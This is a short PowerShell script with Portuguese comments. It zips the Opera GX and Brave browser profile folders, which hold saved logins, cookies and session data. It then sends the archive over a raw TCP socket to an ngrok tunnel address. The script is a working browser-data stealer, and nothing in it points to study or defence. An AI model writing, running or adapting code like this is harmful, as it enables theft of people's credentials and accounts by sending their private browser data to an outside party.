$roaming = "$env:APPDATA\Opera Software\Opera GX Stable\Default"
$local   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$temp    = $env:TEMP
$zip     = "$temp\OwO.zip"

# Remove ZIP antigo
if (Test-Path $zip) {
    Remove-Item $zip -Force
}

# Lista de pastas possíveis
$pastas = @($roaming, $local)

# Mantém só as que existem
$pastasExistentes = $pastas | Where-Object { Test-Path $_ }

# Só cria o ZIP se tiver algo pra compactar
if ($pastasExistentes.Count -gt 0) {

    Compress-Archive `
        -Path $pastasExistentes `
        -DestinationPath $zip `
        -Force

    # Envia via TCP
    $c = New-Object Net.Sockets.TCPClient("0.tcp.eu.ngrok.io", 12118)
    $s = $c.GetStream()
    $b = [IO.File]::ReadAllBytes($zip)
    $s.Write($b, 0, $b.Length)
    $s.Flush()
    $s.Close()
    $c.Close()
}
